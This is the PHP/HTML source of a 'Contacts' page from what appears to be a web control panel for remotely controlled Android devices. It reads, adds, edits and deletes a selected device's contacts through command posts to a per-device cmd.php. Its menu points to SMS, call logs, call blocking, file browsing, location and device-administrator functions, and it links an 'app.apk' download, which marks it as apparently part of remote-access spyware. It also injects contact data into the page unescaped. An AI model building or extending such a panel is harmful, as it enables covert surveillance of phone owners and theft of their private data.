<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
<?php
	require "db.php";
	if($_SESSION['logged_used']==null || $_SESSION['device_select']==null){
      header('Location: /index');
      exit;
    }
?>

<head>
  <meta charset="UTF-8">
    <title>Контакты</title>
    <link rel="stylesheet" href="./style/contacts.css">
    <link rel="stylesheet" href="./style/menu.css">
    <link rel="stylesheet" href="./style/button.css">
    <link rel="stylesheet" href="./style/barsearch.css">
    <link rel="stylesheet" href="./style/osn.css">


    <script src="./libs/jquery-3.1.1.min.js"></script>
    <script src="./scripts/menu.js"></script>

    <meta http-equiv="X-UA-Compatible" content=="IE=edge"/>
    <meta name="google" value="notranslate"/>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

</head>
<body>
	<section class="menu">
		<nav class="main-menu">
		  <p></p>
		  <div class="scrollbar" id="style-1">
		    <ul>
		      <li>                                   
		        <a href="home">
		          <i class="fa2 theme--light material-icons">home</i>
		          <span class="nav-text">Главная</span>
		        </a>
		      </li>
		      <li>                                   
		        <a href="Contacts">
		          <i class="fa2 theme--light material-icons">contacts</i>
		          <span class="nav-text">Контакты</span>
		        </a>
		      </li>
		      <li>                                 
		        <a href="Call">
		          <i class="fa2 theme--light material-icons">call</i>
		          <span class="nav-text">Журнал вызовов</span>
		        </a>
		      </li>   
		      <li>
		        <a href="Block">
		          <i class="fa2 theme--light material-icons">block</i>
		          <span class="nav-text">Блок вызовов</span>
		        </a>
		      </li>
		      <li>
		        <a href="Sms">
		          <i class="fa2 theme--light material-icons">message</i>
		          <span class="nav-text">Сообщения</span>
		        </a>
		      </li>
		      <li>
		        <a href="FileManager">
		          <i class="fa2 theme--light material-icons">storage</i>
		          <span class="nav-text">Проводник</span>
		        </a>
		      </li>
		      <li>
		        <a href="Location">
		          <i class="fa2 theme--light material-icons">my_location</i>
		          <span class="nav-text">Расположение</span>
		        </a>
		      </li>
		      <li>
		        <a href="#">
		          <i class="fa2 theme--light material-icons">perm_media</i>
		          <span class="nav-text">Загрузки</span>
		        </a>
		      </li>
		      <li>
		        <a href="#">
		          <i class="fa2 theme--light material-icons">view_list</i>
		          <span class="nav-text">Команды</span>
		        </a>
		      </li>
		      <li>
		        <a href="#">
		          <i class="fa2 theme--light material-icons">list_alt</i>
		          <span class="nav-text">Журнал приложений</span>
		        </a>
		      </li>
		      <li>
		        <a href="#">
		          <i class="fa2 theme--light material-icons">details</i>
		          <span class="nav-text">Информация об устройстве</span>
		        </a>
		      </li>
		      <li>
		        <a href="#">
		          <i class="fa2 theme--light material-icons">security</i>
		          <span class="nav-text">Администратор устройства</span>
		        </a>
		      </li>
		    </ul>
		  </div>
		</nav>
		<header>
			<div class="head">
			<div class="main-info">
			  Выбрано устройство: <?php echo $_SESSION['headerDev']; ?>
			</div>
			<div class="spacer"></div>

			<a href="app.apk" download="">
			  <button type="button" class="btn" id="download">
			    <span class="spn">
			      <i class="theme--light material-icons md-36" >get_app</i>
			    </span>
			  </button>
			</a>
			<div class="usm" onclick="usermenu()">
			  <nav title="User Menu" >
			    <button type="button" class="btn">
			      <span class="spn">
			        <i class="theme--light material-icons md-36" >account_circle</i>
			      </span>
			    </button>
			    <ul id="usermenu" class="UserMenu" data-open="false" >
			      <li title="Индификатор">
			        <span style="margin-left: 12px;" class="UserMenu_text">Индификатор: <?=$_SESSION['sid'] ?></span>
			      </li>
			      <li title="Профиль" class="UserMenu_brdt">
			        <a href="Account">
			              <i class="fa2 theme--light material-icons wh"  >person</i>
			              <span class="UserMenu_text">Профиль</span>
			          </a>
			      </li>
			      <li class="UserMenu_brdt" title="Выйти">
			        <a href="logout">
			            <i class="fa2 theme--light material-icons wh">exit_to_app</i>
			            <span class="UserMenu_text">Выйти</span>
			          </a>
			      </li>
			    </ul>
			  </nav>
			</div>

			</div>
		</header>
	</section>

  <div class="v-content fix">
    <div class="v-content_wrap">

      <div id="ChangeBoard" class="changeBoard">
        <form action="/Devices/<?=$_SESSION['device_select']->device_id?>/cmd.php" method="post" name="changeF" autocomplete="off">
          <div id="numOrig" style="visibility:hidden;font-size: 0.001em;"></div>
          <input type="text" name="name" id="name" value="" />
          <input type="text" name="phonenum" id="phonenum" value="" />
          <input type="button" id="chnb" value="Изменить" />
        </form>
      </div>

      <div class="container container--fluid">
        <div class="w3-container">
          <div class="w3-card-4">
            <header class="w3-container w3-blue w3-header"> <h1>Управление</h1> </header>

            <div class="status">
              <pre>Онлайн:<div id="lastonline"></div></pre>
              <pre>Лог:<div id="output"></div></pre> 
              <div id="log"></div>
            </div>

            <div class="addBoard">
              <div style="float:left;">
                <input type="text" placeholder="Имя контакта" id="addname" autocomplete="off" value=""/>
                <input type="text" placeholder="Номер" id="addphone" autocomplete="off" value="" />
              </div>
              <div>
                <input type="button" class="btn-add" id="btnAdd" value="Добавить" />
              </div>
              
            </div>

            <p></p>
            <input type = "button" id = "loaded" class="btn-load" value = "Загрузить" onclick="loaded()" style="margin-left:10px;"/>
            <pre></pre>
            <input type = "button" class="btn-del" value = "Отчистить" onclick="ochistka()" style="margin-left:10px;margin-bottom:10px;"/>
            
          </div>
        </div>
        <div class="barsearch" >
            <input type="text" id="search" placeholder="Поиск по таблице" autocomplete="off">
        </div>
        <div class="parent" style="margin-top: 40px;">
          <p></p>
          <div class="w3-container">
            <div class="w3-card-4 card">
              <p></p>
              <body>
                <table id="excelDataTable" border="1">
                </table>
              </body>
            </div>
          </div>
        </div>

      </div>
    </div>
  </div>
  
</body>

<script>
$(document).ready(function(){
  $("#search").keyup(function(){
    _this = this;
  $.each($("#excelDataTable tbody tr"), function() {
          if($(this).text().toLowerCase().indexOf($(_this).val().toLowerCase()) === -1 && $(this).text().toLowerCase().indexOf("phoneNumber".toLowerCase()) === -1 && $(this).text().toLowerCase().indexOf("name".toLowerCase()) === -1 && $(this).text().toLowerCase().indexOf("Controls".toLowerCase()) === -1){
              $(this).hide();
          } else {
              $(this).show();                
          }
        });
    })
  });

</script>


<script type="text/javascript">

  var myList;

  getOnline();

  getOutput(); 

  getTab();

  function buildHtmlTable(selector) {
    ochistka();
    var columns = addAllColumnHeaders(myList, selector);

    for (var i = 0; i < myList.length; i++) {
      var row$ = $('<tr/>');
      for (var colIndex = 0; colIndex < columns.length; colIndex++) {
        var cellValue = myList[i][columns[colIndex]];
        if (cellValue == null) cellValue = "";

        row$.append($('<td/>').html(cellValue));
      }
      row$.append($('<td/>').html("<input type=button value=\"Удалить\" style=\"width:50%;heigth:100%;padding:0;float:left;\" class=\"btn-del\" onclick=\"del('"+i+"')\"> <input type=button value=\"Изменить\" style=\"width:50%;heigth:100%;padding:0;float:right;\" class=\"btn-chn\" onclick=\"chn('"+i+"')\">"));
      $(selector).append(row$);
    }
  }

  function addAllColumnHeaders(myList, selector) {
    var columnSet = [];
    var headerTr$ = $('<tr/>');

    for (var i = 0; i < myList.length; i++) {
      var rowHash = myList[i];
      for (var key in rowHash) {
        if(key == "raw_id")
          break;
        if ($.inArray(key, columnSet) == -1) {
          columnSet.push(key);

          headerTr$.append($('<th/>').html(key));
        }
      }
    }
    headerTr$.append($('<th/>').html("Controls"));
    $(selector).append(headerTr$);

    return columnSet;
  }

  function ochistka(){
     $("tr").remove();
  }

  
  function loaded(){
    $.post( 
      "/Devices/<?=$_SESSION['device_select']->device_id?>/cmd.php",
      { cmd: "",spec:"getContactsList"},
      function(data) {
        $('#stage').html(data);
        
      }
    );
  }

  function getOnline() {
      $('#lastonline').load('/Devices/<?=$_SESSION['device_select']->device_id ?>/getlastonline.php');
      setTimeout("getOnline()",2000);
  }

  function getOutput() {
    $('#log').load('/Devices/<?php echo $_SESSION['device_select']->device_id ?>/show_output.php').hide(true);
    var str = $('#log').text();
    if(str.includes("Contacts"))
    	$('#output').html($('#log').text());

    setTimeout("getOutput()",2000);
  }

  function getTab(){
      var JsonList=$.getJSON("/Devices/<?php echo $_SESSION['device_select']->device_id ?>/info/Contacts/contacts.json",function(data){
        myList = data['contactsList'];
        buildHtmlTable('#excelDataTable');
      });
      
      setTimeout("getTab()",20000);
  }

  function chn(num){
    var i= num[0];
    var elem = document.querySelector("#ChangeBoard");
    elem.classList.toggle("open");
    
    var name = myList[i]["name"];
    var phone = myList[i]["phoneNumber"];
    
    document.changeF.name.value = name;
    document.changeF.phonenum.value = phone;
    $("#numOrig").html(i);
  }

  function del(num)
  {
    var i= num[0];
    var nameV = myList[i]["name"];
    var phoneV = myList[i]["phoneNumber"];
    var rawV = myList[i]["raw_id"];

    let user = {
          name: nameV,
          phone: phoneV,
          raw:rawV,

          toString() {
            return `{name: "${this.name}", phone: "${this.phone}", raw: "${this.raw}"}`;
          }
        };
    $.post( 
      "/Devices/<?=$_SESSION['device_select']->device_id?>/cmd.php",
      { cmd: "",spec:"ContDel "+user},
      function(data) {
        $('#stage').html(data);
      }
    );

  }
</script>
<script type = "text/javascript" language = "javascript">
$(document).ready(function() {
    $("#chnb").click(function(event){
      var num = $("#numOrig").html();

      var nameV = myList[num]["name"];
      var phoneV = myList[num]["phoneNumber"];
      var rawV = myList[num]["raw_id"];

      var N_name =$("#name").val();
      var N_phone = $("#phonenum").val();

      let user = {
          raw:rawV,
          name: nameV,
          phone: phoneV,
          Nname:N_name,
          Nphone:N_phone,

          toString() {
            return `{raw: "${this.raw}",name: "${this.name}", phone: "${this.phone}",Nname: "${this.Nname}",Nphone: "${this.Nphone}"}`;
          }
        };

      $.post( 
        "/Devices/<?=$_SESSION['device_select']->device_id?>/cmd.php",
        { cmd: "",spec:"ContChn "+user},
        function(data) {
          $('#stage').html(data);
        }
      );
      
      var elem = document.querySelector("#ChangeBoard");
      elem.classList.toggle("open");

      document.changeF.name.value = "";
      document.changeF.phonenum.value = "";
      $("#numOrig").html("");
    });

    $("#btnAdd").click(function(event){
        var phoneV = $("#addphone").val();
        var nameV = $("#addname").val();

        let user = {
          name: nameV,
          phone: phoneV,
          stand: true,

          toString() {
            return `{name: "${this.name}", phone: "${this.phone}", stand: "${this.stand}"}`;
          }
        };

        $.post( 
          "/Devices/<?=$_SESSION['device_select']->device_id?>/cmd.php",
          { cmd: "",spec:"ContAdd "+user},
          function(data) {
            $('#stage').html(data);
          }
        );
        $("#addphone").val("");
        $("#addname").val("");
    });
  });
</script>


</html>